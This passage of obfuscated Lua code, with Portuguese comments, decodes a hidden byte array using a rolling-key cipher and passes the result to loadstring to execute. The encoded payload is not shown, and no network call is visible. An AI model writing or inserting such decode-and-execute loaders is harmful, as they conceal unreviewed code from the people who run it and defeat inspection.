    local function VM_l100(d, k, m)
        local R_1l1l0 = {}
        local c_key = k
        local char = string.char
        local insert = table.insert
        
        -- Virtual Machine Loop
        for idx = 1, #d do
            local val = d[idx]
            -- Decodificacao Rolling Key
            local dec = (val / m) - c_key
            
            -- Anti-Crash Mobile (Garante byte valido)
            dec = dec % 256
            
            insert(R_1l1l0, char(dec))
            
            -- Atualiza a chave para o proximo (Rolling)
            c_key = (c_key + 13) % 150
        end
        return table.concat(R_1l1l0)
    end

    -- Execution Guard
    local F_1IIlll0 = loadstring(VM_l100(B_1IOIO01O, 38, 5))
    if F_1IIlll0 then
        F_1IIlll0(...)
    end
end)(...)
